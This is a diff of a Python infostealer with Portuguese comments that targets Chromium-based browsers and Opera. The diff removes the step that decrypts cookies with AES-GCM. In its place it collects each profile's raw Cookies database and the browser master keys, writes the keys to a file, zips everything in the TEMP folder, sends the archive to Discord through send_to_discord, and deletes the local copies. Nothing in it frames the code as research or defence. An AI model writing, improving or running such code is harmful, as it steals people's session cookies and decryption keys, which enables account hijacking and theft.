@@ -64,72 +64,43 @@ class Browsers:
         except:
             return None
 
-    def decrypt_value(self, buff, master_key):
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted = cipher.decrypt(payload)[:-16].decode()
-            return decrypted
-        except:
-            return ""
+
 
     def grab_cookies(self):
-        output_file = os.path.join(os.getenv('TEMP'), 'cookies_raw.txt')
-        if os.path.exists(output_file):
-            os.remove(output_file)
+        keys_file = os.path.join(os.getenv('TEMP'), 'keys.txt')
+        if os.path.exists(keys_file): os.remove(keys_file)
+        
+        zip_path = os.path.join(os.getenv('TEMP'), 'cookies_data.zip')
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for name, path in self.browsers.items():
+                if not os.path.isdir(path): continue
 
-        for name, path in self.browsers.items():
-            if not os.path.isdir(path):
-                continue
-
-            master_key = self.get_master_key(os.path.join(path, 'Local State'))
-            if not master_key: continue
-
-            for profile in self.profiles:
-                cookie_path = os.path.join(path, profile, 'Network', 'Cookies') if 'opera' not in name else os.path.join(path, 'Network', 'Cookies')
-                
-                if not os.path.isfile(cookie_path):
+                master_key = self.get_master_key(os.path.join(path, 'Local State'))
+                if not master_key:
                     continue
 
-                temp_db = create_temp()
-                copy2(cookie_path, temp_db)
-                
-                try:
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    with open(output_file, 'a', encoding="utf-8") as f:
-                        f.write(f"\n--- Browser: {name} | Profile: {profile} ---\n")
-                        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
-                        for host, c_name, c_path, enc_val, expires in cursor.fetchall():
-                            val = self.decrypt_value(enc_val, master_key)
-                            if val:
-                                f.write(f"{host}\t{'TRUE' if expires != 0 else 'FALSE'}\t{c_path}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{c_name}\t{val}\n")
-                    conn.close()
-                except:
-                    pass
-                finally:
-                    os.remove(temp_db)
+                with open(keys_file, 'a', encoding="utf-8") as kf:
+                    kf.write(f"Browser: {name} | Key: {master_key.hex()}\n")
 
-        return output_file
+                for profile in self.profiles:
+                    cookie_path = os.path.join(path, profile, 'Network', 'Cookies') if 'opera' not in name else os.path.join(path, 'Network', 'Cookies')
+                    if os.path.isfile(cookie_path):
+                        # Adiciona o arquivo de cookies ao zip com nome único
+                        arc_name = f"{name}_{profile}_cookies.db"
+                        zipf.write(cookie_path, arcname=arc_name)
+            
+            if os.path.exists(keys_file):
+                zipf.write(keys_file, arcname='keys.txt')
+
+        if os.path.exists(keys_file): os.remove(keys_file)
+        return zip_path
 
 def main():
-    # 1. extração
     b = Browsers()
-    raw_txt = b.grab_cookies()
+    zip_path = b.grab_cookies()
 
-    if os.path.exists(raw_txt):
-        # 2. compactação
-        zip_path = os.path.join(os.getenv('TEMP'), 'cookies.zip')
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            zipf.write(raw_txt, arcname='cookies.txt')
-        
-        # 3. envio
+    if os.path.exists(zip_path):
         send_to_discord(zip_path)
-        
-        # limpeza
-        os.remove(raw_txt)
         os.remove(zip_path)
-
 if __name__ == "__main__":
     main()
